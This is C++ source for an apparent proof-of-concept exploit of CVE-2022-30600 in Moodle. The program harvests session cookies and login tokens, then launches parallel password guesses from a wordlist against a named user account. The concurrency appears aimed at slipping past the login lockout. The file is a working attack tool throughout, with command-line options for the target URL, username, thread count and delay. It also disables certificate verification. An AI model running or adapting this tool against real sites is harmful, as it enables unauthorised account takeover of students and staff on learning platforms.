//Rewritten version of poc.py
//POC for CVE-2022-30600
//This script allows an attacker to bruteforce the login on a givin account. 
//You need to tweek the parameters based on how many requests the server can handle and the specs of your machine.

//Possable Improvements:
//  More checks throughout the application to confirm if an error state is reached.

#include <iostream>
#include <string>
#include <thread>
#include <curl/curl.h>
#include <cxxopts.hpp>
#include <unistd.h>
#include <fstream>
#include <stdlib.h>


using namespace std;

string PASSWORD = "";
int ERROR_RATE = 0;
bool PAUSE_THREADS = true;

/// @brief Parses the output from curl
size_t write_funtion(void *ptr, size_t size, size_t nmemb, string* data) {
    data->append((char*) ptr, size * nmemb);
    return size * nmemb;
}



/// @brief This funtion performs the get request using the curl library. 
// A number of options are set as default.
// Requests will ignore any SSL error. (My moodle server uses a self signed certificate).
// Requests will be over HTTPS.
// All redirections will be followed.
/// @param curl Pointer to the curl handler
void get_request(CURL *curl) {
           
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 5L);
    curl_easy_setopt(curl, CURLOPT_USE_SSL, CURLUSESSL_ALL);
    curl_easy_setopt(curl, CURLOPT_NOPROGRESS, (long)CURL_HTTP_VERSION_2TLS);
    curl_easy_setopt(curl, CURLOPT_PROXY, "http://127.0.0.1:8080"); // This is a proxy server I used for debugging

    curl_easy_perform(curl);

    curl_easy_cleanup(curl);
    

}

/// @brief Used to implement the logic for a login request.
// This was done to keep the logic for the request within a single object. 
class Login_Request {
private:

    /// @brief Checks if a givin request was processed correctly by the moodle webapp. It also sets the PASSWORD global varibale if a given request was able to login.
    /// @param outputBuffer HTTP response body after being processed by write_funtion
    /// @param password The password used in this request
    /// @return bool to confirm if a given request was seccessfully process by the webapp.
    bool _parse_response(string outputBuffer, string password) {

        int titleindex = outputBuffer.find("title>") + 6;

        string title;

        for (int i = titleindex; outputBuffer[i] != '<' ; i++) {
            title += outputBuffer[i];
        }
        
        if (title == "Error") {
            return false;
        } else if (title == "Dashboard") {
            PASSWORD = password;
        } 

        //Sometimes the session token can timeout. This means that the password is correct, but the user isn't re-directed to the dashboard of the webapp
        //Below is a check if the session timeout message occurs. If you see this, then the password used was correct.

        int sessionTimeOut = outputBuffer.find("Your session has timed out");

        if (sessionTimeOut != -1) {
            PASSWORD = password;
        }
        
        return true;
        
    }

public:
    /// @brief Overloaded () operator. Contains the main logic for the making a login request.
    /// @param url url of the moodle webapp.
    /// @param username username of the account being target.
    /// @param password the password that is going to be attempted.
    /// @param sessionCookie session cookie used required for login.
    /// @param loginToken login token used required for login.
    void operator()(string url, string username ,string password, string sessionCookie, string loginToken){

        while (PAUSE_THREADS) {
            (void)0;
        }

        string outputBuffer; 
        string cookie = "MoodleSession=" + sessionCookie;        

        CURL *curl = curl_easy_init();

        struct curl_slist *chunk = NULL;

        char *input1 = curl_easy_escape(curl, loginToken.c_str(), 0);
        char *input2 = curl_easy_escape(curl, username.c_str(), 0);
        char *input3 = curl_easy_escape(curl, password.c_str(), 0);

        string postData = "logintoken=" + string(input1) + "&username=" + string(input2) + "&password=" + string(input3);
        
        curl_easy_setopt(curl, CURLOPT_COOKIE, cookie.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postData.c_str());
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_funtion);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &outputBuffer);
        curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "POST");

        get_request(curl);

        if (PASSWORD != "") {
            cout << "PASSWORD FOUND\n";
        } else if(_parse_response(outputBuffer, password)) {
            cout << "successful request with password " << password << endl;
        } else {
            ERROR_RATE++;
            cout << ERROR_RATE;
            cout << "failed request with password " << password << endl;
        }
            
    }
};

/// @brief Used to implement the logic for getting cookies request.
// This was done to keep the logic for the request within a single object. 
class get_cookies_for_login {
private:
    /// @brief Get the moodle cookie value from the header of a HTTP response.
    /// @param headerBuffer HTTP response header after being processed by write_funtion.
    /// @return Moodle cookie value.
    string _parse_moodle_cookie(string headerBuffer) {
        int cookieIndex = headerBuffer.find("MoodleSession=") + 14;
        string cookie;

        for (int i = cookieIndex; headerBuffer[i] != ';' ; i++) {
            cookie += headerBuffer[i];
        }

        return cookie;
    }

    /// @brief Get the login token value from the header of a HTTP response.
    /// @param headerBuffer HTTP response header after being processed by write_funtion.
    /// @return Login token value.
    string _parse_moodle_login_token(string outputBuffer) {
        int loginTokenIndex = outputBuffer.find("name=\"logintoken\" value=\"") + 25;
        string loginToken;

        for (int i = loginTokenIndex; outputBuffer[i] != '"' ; i++) {
            loginToken += outputBuffer[i];
        }
        
        return loginToken;
    }


public:
    /// @brief Main logic for getting the cookie and login token needed for a login request.
    /// @param url url of the moodle webapp.
    /// @return string array containing the cookie in the 1st element and the login token in the 2nd element.
    string* operator()(string url) {
        //Prepare Curl object and pass to get_request function to 
        string outputBuffer;
        string headersBuffer;
        string *returnValue = new string[2];

        CURL *curl = curl_easy_init();       
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, write_funtion);
        curl_easy_setopt(curl, CURLOPT_HEADERDATA, &headersBuffer);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_funtion);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &outputBuffer);

        get_request(curl);
        
        returnValue[0] = _parse_moodle_cookie(headersBuffer);
        returnValue[1] = _parse_moodle_login_token(outputBuffer);

        return returnValue;
    }

};

/// @brief The main logic for each attempt in the application.
/// @param url URL of the moodle webapp.
/// @param username Username of account being targeting
/// @param wordlist array of password being attempted
/// @param threads the amount of threads that will created. 
void prepare_and_start_threads(string url, string username, string wordlist[], int threads) {
    thread newThreads[threads];
    string cookieAndToken[threads][2];

    get_cookies_for_login cookiesObj;
    for (int i = 0; i < threads; i++) {
        string *cookieAndTokenPair = cookiesObj(url);
        cookieAndToken[i][0] = cookieAndTokenPair[0];
        cookieAndToken[i][1] = cookieAndTokenPair[1];
        cout << "Cookie : " << cookieAndToken[i][0] << " Login Token : " << cookieAndToken[i][1] << endl;
        
    }
    
    PAUSE_THREADS = true;

    for (int i = 0; i < threads; i++) {
        newThreads[i] = thread(Login_Request(), url, username, wordlist[i], cookieAndToken[i][0], cookieAndToken[i][1]);
        PAUSE_THREADS = false;
    }

    curl_global_cleanup();
    for (int i = 0; i < threads; i++) {
        newThreads[i].join();
    }

}

bool moodle_connectivity_check(string url) {
    string outputBuffer;

    CURL *curl = curl_easy_init();       
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_funtion);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &outputBuffer);

    get_request(curl);

    return !outputBuffer.empty();

}

int main(int argc, char* argv[]) {

    curl_global_init(CURL_GLOBAL_ALL);
    cxxopts::Options options("poc");
    
    options.add_options()
        ("a,attempts", "The amount times the attack is performed.", cxxopts::value<int>()) 
        ("t,threads", "The amount of threads to use in each attempt.", cxxopts::value<int>())
        ("n,username", "The user of the account you are targeting", cxxopts::value<string>())
        ("u,URL", "base URL of the moodle webapp", cxxopts::value<string>())
        ("d,delay", "The time delay between attempts. Default is 5", cxxopts::value<int>())
        ("v,version", "Show the version")
        ("h,help", "Display help message")
        ("w,wordlist", "Wordlist of passwords.", cxxopts::value<string>());

    cxxopts::ParseResult result;

    // Attempt to parse input
    try {
        result = options.parse(argc, argv);

    } catch (const cxxopts::OptionParseException &x) {
        cerr << "poc: " << x.what() << '\n';
        cerr << "usage: poc [options] ...\n";
        cerr << "use -h for more information";
        return EXIT_FAILURE;
    }

    // Display the verison of the application
    if (result.count("version")) {
        cout << "POC v3r510n 1.0\n";
        return EXIT_SUCCESS;
    }

    // Display the help options
    if (result.count("help")) {
        cerr << options.help();
        return EXIT_SUCCESS;
    }

    //Enforcing the varabiles users need to provide
    if (!result.count("wordlist")) {
        cerr << "poc: missing input file\n";
        cerr << "usage: poc -w /path/to/wordlist...\n";
        return EXIT_FAILURE;
    } else if (!result.count("URL")) {
        cerr << "poc: URL missing\n";
        cerr << "usage: poc -u http://target.com/...\n";
        return EXIT_FAILURE;
    } else if (!result.count("username")) {
        cerr << "poc: username missing\n";
        cerr << "usage: poc -n username\n";
        return EXIT_FAILURE;
    } else if (!result.count("threads")) {
        cerr << "poc: thread count\n";
        cerr << "usage: poc -t threads to be used ...\n";
        return EXIT_FAILURE;
    }

    //Set up variables
    string wordlistPath = result["wordlist"].as<string>();
    string url = result["URL"].as<string>() + "login/index.php";
    string username = result["username"].as<string>();
    int threads = result["threads"].as<int>();
    int attempts;
    int delay;
    
    //Should the user not provide the attempts and delay flag, it's assumed that d = 5 and a = 1
    if (result.count("attempts")) {
        attempts = result["attempts"].as<int>();
    } else {
        attempts = 1;
    }
    
    if (result.count("delay")) {
        delay = result["delay"].as<int>();
    } else {
        delay = 5;
    }

    //Main logic

    // Open wordlist file and write it to an array

    ifstream wordlistFile(wordlistPath);
    int size_of_array = attempts * threads;
    string wordlist[size_of_array];
    int itterator = 0;

    if (wordlistFile.is_open()) {
	    string line;
        while (getline(wordlistFile, line)) {
            wordlist[itterator] = line;
            itterator++;
            if (itterator == size_of_array) {
                break;
            }
        }
    }

    //Gets the headers of the webapp to confirm that the application is online

    cout << "Confirming that web app is online\n";

    if (moodle_connectivity_check(url)) {
        cout << "webapp appears to be online. Proceeding with exploit\n";
    } else {
        cerr << "Cannot connect to the webapp. Exiting the application...\n";
        return EXIT_FAILURE;   
    }
    

    // Loop through main logic based on the amount of attempts
    for (int i = 0; i < attempts; i++) {

        //Create shorter worklist file
        string subwordlist[threads];
        
        for (int j=(i * threads); j < (((i + 1) * threads)); j++) {        
            subwordlist[j % threads] = wordlist[j];
        }

        prepare_and_start_threads(url, username, subwordlist, threads);

        //Calculate the average amount of errors in a given attmempt
        float rate = ((ERROR_RATE / threads) * 100);

        cout << "Average Error Rate : " << rate << "%" << endl;

        ERROR_RATE = 0;

        if (PASSWORD != ""){
            cout << "Password found " << PASSWORD << endl;
            break;
        } 
        sleep(delay);
    }

    
    return 0;
}
